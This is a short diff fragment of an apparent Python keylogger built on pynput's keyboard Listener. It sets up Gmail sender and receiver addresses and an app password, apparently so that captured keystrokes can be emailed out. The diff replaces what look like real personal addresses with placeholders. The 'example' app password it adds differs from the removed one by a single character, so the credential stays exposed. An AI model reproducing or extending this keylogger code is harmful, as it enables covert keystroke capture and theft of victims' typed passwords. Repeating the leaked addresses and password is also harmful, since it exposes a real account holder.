@@ -5,9 +5,9 @@ from pynput.keyboard import Key, Listener
 
 keys = []
 
-sender_email = "geeklawz@gmail.com"
-receiver_email = "loseh23@gmail.com"
-email_password = "dgai hkhh zfch iubq" 
+sender_email = "youremail@gmail.com"
+receiver_email = "receiveremail@gmail.com"
+email_password = "dgai hkhh zfch iuba" #Example of a gmail app password 
 
 def on_press(key):
     global keys
